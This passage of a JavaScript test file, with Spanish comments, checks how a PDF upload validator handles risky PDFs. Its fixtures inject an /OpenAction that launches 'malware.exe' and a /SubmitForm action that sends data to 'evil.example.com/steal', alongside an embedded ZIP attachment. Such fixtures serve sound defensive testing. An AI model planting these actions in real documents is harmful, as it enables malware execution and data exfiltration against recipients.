    const newCatalog = catalogMatch[0].replace(
      '>>',
      ' /OpenAction 10 0 R >>'
    );
    buf = Buffer.from(
      bufStr.replace(catalogMatch[0], newCatalog) +
      '\n10 0 obj\n<< /Type /Action /S /Launch /F (malware.exe) >>\nendobj\n',
      'latin1'
    );
  }

  const r = await runMiddleware({ originalname: 'launch-action.pdf', buffer: buf });
  if (r.nextArg) {
    assert.equal(r.nextArg.statusCode, 422);
    if (r.nextArg.code === 'PDF_INVALID') {
      assert.equal(r.nextArg.details && r.nextArg.details.reason, 'parse_error',
        'rechazo por xref corrupto es OK; rechazo por "/Launch no permitido" seria CONTRACT MISMATCH');
    }
  } else {
    assert.ok(r.req.pdfValidation);
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});

test('§S6.3: PDF con /EmbeddedFile (anexo ZIP) → pasa estructuralmente', async () => {
  // pdf-lib tiene API para agregar archivos embebidos. Si funciona, el
  // PDF resultante tiene /EmbeddedFile en el Catalog. El validator
  // debe pasarlo.
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([612, 792]);
  page.drawText('Doc con anexo', { x: 72, y: 720, size: 12 });
  // Intentar embeber un archivo.
  let buf;
  try {
    await pdf.attach(Buffer.from('zip contents'), 'anexo.zip', {
      mimeType: 'application/zip',
    });
    buf = Buffer.from(await pdf.save());
  } catch (e) {
    // pdf-lib 1.17.1 puede no soportar attach. Fallback: PDF simple.
    buf = Buffer.from(await pdf.save());
  }

  const r = await runMiddleware({ originalname: 'with-attachment.pdf', buffer: buf });
  if (r.nextArg) {
    assert.equal(r.nextArg.statusCode, 422);
    // Si fallo, debe ser por algo del PDF (no del /EmbeddedFile).
    assert.match(r.nextArg.code, /^PDF_/);
  } else {
    assert.ok(r.req.pdfValidation);
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});

test('§S6.4: PDF con form action (submit a URL externa) → pasa estructuralmente', async () => {
  // Inyeccion manual de /SubmitForm action en el Catalog.
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([612, 792]);
  page.drawText('Doc con form submit', { x: 72, y: 720, size: 12 });
  let buf = Buffer.from(await pdf.save());

  const bufStr = buf.toString('latin1');
  const catalogMatch = bufStr.match(/<<\s*\/Type\s*\/Catalog[^>]*>>/);
  if (catalogMatch) {
    const newCatalog = catalogMatch[0].replace(
      '>>',
      ' /OpenAction 10 0 R >>'
    );
    buf = Buffer.from(
      bufStr.replace(catalogMatch[0], newCatalog) +
      '\n10 0 obj\n<< /Type /Action /S /SubmitForm /F << /FS /URL /F (http://evil.example.com/steal) >> >>\nendobj\n',
      'latin1'
    );
  }

  const r = await runMiddleware({ originalname: 'form-submit.pdf', buffer: buf });
  if (r.nextArg) {
    assert.equal(r.nextArg.statusCode, 422);
    if (r.nextArg.code === 'PDF_INVALID') {
      assert.equal(r.nextArg.details && r.nextArg.details.reason, 'parse_error',
        'rechazo por xref corrupto OK; rechazo por form action seria CONTRACT MISMATCH');
    }
  } else {
    assert.ok(r.req.pdfValidation);
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});
